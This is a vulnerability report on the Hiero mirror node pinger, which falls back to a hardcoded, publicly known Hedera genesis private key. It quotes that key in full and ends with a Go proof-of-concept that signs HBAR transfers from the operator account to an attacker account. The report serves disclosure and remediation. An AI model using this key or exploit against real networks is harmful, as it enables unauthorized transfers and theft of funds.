### Title
Hardcoded Default Operator Private Key Enables Unauthorized Transaction Submission as Pinger Operator Account

### Summary
The pinger's `config.go` hardcodes the well-known Hedera genesis/treasury private key as the default value for `HIERO_MIRROR_PINGER_OPERATOR_KEY`. Any attacker who reads the public source code obtains this private key verbatim. If a deployment omits the environment variable, the attacker can use the key to sign and submit `CryptoTransfer` transactions to the Hashgraph consensus network that are indistinguishable from legitimate pinger activity, polluting the operator account's transaction history recorded by the mirror node.

### Finding Description
**Exact code location:**

`pinger/config.go`, line 40 — `loadConfig()`:
```go
flag.StringVar(&cfg.operatorKey, "operator-key",
    envOr("HIERO_MIRROR_PINGER_OPERATOR_KEY",
        "302e020100300506032b65700422042091132178e72057a1d7528025956fe39b0b847f200ab59b2fdd367017f3087137"),
    "operator private key string")
``` [1](#0-0) 

The DER-encoded value `302e020100300506032b65700422042091132178e72057a1d7528025956fe39b0b847f200ab59b2fdd367017f3087137` is the publicly documented Hedera genesis/treasury Ed25519 private key (raw scalar `91132178e72057a1d7528025956fe39b0b847f200ab59b2fdd367017f3087137`). It is committed in plain text in a public repository.

`pinger/sdk_client.go`, lines 40–45 — `newClient()`:
```go
opKey, err := hiero.PrivateKeyFromString(cfg.operatorKey)
...
client.SetOperator(opID, opKey)
``` [2](#0-1) 

`pinger/transfer.go`, lines 29–33 — `submitWithRetry()`:
```go
cryptoTransfer := hiero.NewTransferTransaction().
    AddHbarTransfer(client.GetOperatorAccountID(), hiero.HbarFromTinybar(-cfg.amountTinybar)).
    AddHbarTransfer(toID, hiero.HbarFromTinybar(cfg.amountTinybar))
resp, err := cryptoTransfer.Execute(client)
``` [3](#0-2) 

**Root cause:** The fallback value passed to `envOr()` is a real, functional private key that is publicly visible in source. The `envOr` helper only substitutes the env-var value when the variable is non-empty; if it is absent or blank, the hardcoded key is used without any warning or error. [4](#0-3) 

**Exploit flow:**
1. Attacker reads `config.go` from the public repository and extracts the 32-byte Ed25519 private key.
2. Attacker queries the mirror node REST API to confirm the operator account (`0.0.2` by default) and its current balance.
3. Attacker constructs a `CryptoTransfer` transaction signed with the extracted key, targeting any destination account.
4. Attacker submits the transaction directly to any Hedera/Hiero consensus node (public gRPC endpoint, no authentication required).
5. The consensus network accepts the transaction (valid signature for the account), records it, and the mirror node ingests it — the entry is attributed to the pinger's operator account.

**Why existing checks are insufficient:**
- `loadConfig()` validates that `operatorKey` is non-empty (line 105–107), but never checks whether it equals the known-insecure default. [5](#0-4) 
- There is no runtime warning, startup assertion, or deployment guard that rejects the default key in non-test environments.
- The Helm chart `values.yaml` does not set `HIERO_MIRROR_PINGER_OPERATOR_KEY`, meaning a default Helm install ships with the exposed key active. [6](#0-5) 

### Impact Explanation
An attacker in possession of the operator private key can: (1) drain the operator account's HBAR balance by redirecting transfers to an attacker-controlled account; (2) submit arbitrary `CryptoTransfer` transactions attributed to the pinger operator, injecting spurious entries into the mirror node's transaction history for that account; (3) interfere with the pinger's own health-check logic if it relies on observing its own transaction history via the mirror REST API. On testnet/previewnet the default account `0.0.2` is the treasury, amplifying the blast radius. On a custom ("other") network where an operator forgot to override the key, the impact is identical and the account may hold significant funds.

### Likelihood Explanation
Exploitation requires zero privileges: the key is in a public Git repository, consensus node gRPC endpoints are publicly reachable, and the Hiero Go SDK (or any Ed25519 library) is sufficient to sign and submit a transaction. The default Helm chart does not inject the env-var, so any operator who deploys via Helm without explicitly setting the secret is vulnerable. The attack is fully repeatable and scriptable.

### Recommendation
1. **Remove the hardcoded default entirely.** Change the `envOr` call to use an empty string as the fallback and make `loadConfig()` return an error when `operatorKey` is empty, forcing operators to supply a real key.
2. **Add a startup guard** that compares the loaded key against the known-insecure default and refuses to start if they match.
3. **Add a Kubernetes Secret reference** in the Helm chart for `HIERO_MIRROR_PINGER_OPERATOR_KEY` so the value is never stored in `values.yaml` or passed as a plain env-var.
4. **Rotate** any account that was ever operated with this key on non-local networks.

### Proof of Concept
```bash
# 1. Extract the private key from the public repo (already known)
PRIV_KEY="302e020100300506032b65700422042091132178e72057a1d7528025956fe39b0b847f200ab59b2fdd367017f3087137"

# 2. Write a minimal Go program using hiero-sdk-go
cat > exploit.go << 'EOF'
package main

import (
    "fmt"
    hiero "github.com/hiero-ledger/hiero-sdk-go/v2/sdk"
)

func main() {
    client, _ := hiero.ClientForName("testnet")
    opID, _ := hiero.AccountIDFromString("0.0.2")
    opKey, _ := hiero.PrivateKeyFromString(
        "302e020100300506032b65700422042091132178e72057a1d7528025956fe39b0b847f200ab59b2fdd367017f3087137")
    client.SetOperator(opID, opKey)

    // Transfer 1 tinybar to attacker account 0.0.9999
    dest, _ := hiero.AccountIDFromString("0.0.9999")
    resp, err := hiero.NewTransferTransaction().
        AddHbarTransfer(opID, hiero.HbarFromTinybar(-1)).
        AddHbarTransfer(dest, hiero.HbarFromTinybar(1)).
        Execute(client)
    if err != nil {
        fmt.Println("Error:", err)
        return
    }
    receipt, _ := resp.GetReceipt(client)
    fmt.Println("TX submitted, status:", receipt.Status)
    // Mirror node will now record this TX as originating from 0.0.2 (pinger operator)
}
EOF

go run exploit.go
# Expected: "TX submitted, status: SUCCESS"
# Mirror node REST: GET /api/v1/transactions?account.id=0.0.2 now shows attacker's TX
```
